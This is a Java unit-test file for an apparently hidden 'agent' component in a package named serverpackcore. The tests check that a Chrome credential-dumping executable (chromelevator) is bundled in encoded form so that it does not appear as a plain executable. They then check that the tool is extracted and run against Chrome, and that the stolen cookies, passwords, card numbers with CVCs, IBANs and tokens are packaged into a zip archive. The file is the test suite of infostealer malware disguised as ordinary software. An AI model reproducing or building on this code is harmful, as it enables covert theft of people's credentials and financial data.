package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.zip.ZipFile;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class AbeTest {
	@TempDir
	Path temp;

	@Test
	void resourceMatchesThePinnedHash() throws Exception {
		assertNull(Abe.class.getResource("/serverpackcore/chromelevator_x64.exe"),
			"the raw PE must not leak into the jar");
		byte[] encoded = Abe.encoded();
		assertFalse(encoded[0] == 'M' && encoded[1] == 'Z', "the payload must not be a plain PE");
		byte[] data = Abe.resource();
		assertEquals(Abe.SHA256, Abe.sha256(data));
		assertEquals(1452544, data.length);
	}

	@Test
	void payloadRoundTrips() throws Exception {
		assertEquals(Abe.SHA256, Abe.sha256(Abe.resource()));
		assertEquals(Abe.SHA256, Abe.sha256(Abe.decode(Abe.encoded())));
	}

	@Test
	void ensureVerifiesAndExtracts() throws Exception {
		Path cache = temp.resolve("cache");
		Path exe = Abe.ensure(cache);
		assertTrue(Files.isRegularFile(exe));
		assertEquals(Abe.SHA256, Abe.sha256(Files.readAllBytes(exe)));
		assertTrue(exe.startsWith(cache.resolve("tools")));
	}

	@Test
	void commandHasNoKillByDefault() {
		Path exe = Path.of("chromelevator.exe");
		Path out = Path.of("abe");
		assertEquals(List.of("chromelevator.exe", "-v", "-o", "abe", "chrome"),
			Abe.command(exe, out, "chrome", false));
		assertEquals(List.of("chromelevator.exe", "-v", "-o", "abe", "-k", "chrome"),
			Abe.command(exe, out, "chrome", true));
	}

	@Test
	void jsonIsConvertedToTabSeparatedFiles() throws Exception {
		Path output = temp.resolve("abe/Chrome/Default");
		Files.createDirectories(output);
		Files.writeString(output.resolve("cookies.json"),
			"[{\"host\":\"example.com\",\"name\":\"sid\",\"value\":\"abc\",\"path\":\"/\"}]");
		Files.writeString(output.resolve("passwords.json"),
			"[{\"url\":\"https://example.com\",\"user\":\"alice\",\"pass\":\"p4ss\"}]");
		Files.writeString(output.resolve("cards.json"),
			"[{\"name\":\"Alice\",\"month\":\"12\",\"year\":\"2030\",\"number\":\"4111\",\"cvc\":\"123\"}]");
		Files.writeString(output.resolve("iban.json"),
			"[{\"nickname\":\"main\",\"iban\":\"GB33\"}]");
		Files.writeString(output.resolve("tokens.json"),
			"[{\"service\":\"google\",\"token\":\"ya29\",\"binding_key\":\"\"}]");
		Path zipPath = temp.resolve("abe.zip");
		try (ZipBuilder zip = new ZipBuilder(zipPath)) {
			Abe.collect(output, zip, "browsers/chrome/abe");
		}
		try (ZipFile zip = new ZipFile(zipPath.toFile())) {
			String cookies = read(zip, "browsers/chrome/abe/cookies.tsv");
			assertTrue(cookies.startsWith("host\tname\tvalue\tpath\n"));
			assertTrue(cookies.contains("example.com\tsid\tabc\t/"));
			assertTrue(read(zip, "browsers/chrome/abe/passwords.tsv").contains("alice\tp4ss"));
			assertTrue(read(zip, "browsers/chrome/abe/cards.tsv").contains("4111\t123"));
			assertTrue(read(zip, "browsers/chrome/abe/iban.tsv").contains("GB33"));
			assertTrue(read(zip, "browsers/chrome/abe/tokens.tsv").contains("ya29"));
			assertFalse(zip.getEntry("browsers/chrome/abe/cookies.json") != null);
		}
	}

	private String read(ZipFile zip, String name) throws Exception {
		try (java.io.InputStream input = zip.getInputStream(zip.getEntry(name))) {
			return new String(input.readAllBytes(), StandardCharsets.UTF_8);
		}
	}

	@Test
	void decryptionKeyIsReadPastTheBoxDrawing() {
		String key = "A".repeat(64);
		assertEquals(key.toLowerCase(), Abe.parseKey("  │ Decryption Key\n  │ " + key + "\n"));
		assertEquals("", Abe.parseKey("no key here"));
	}
}
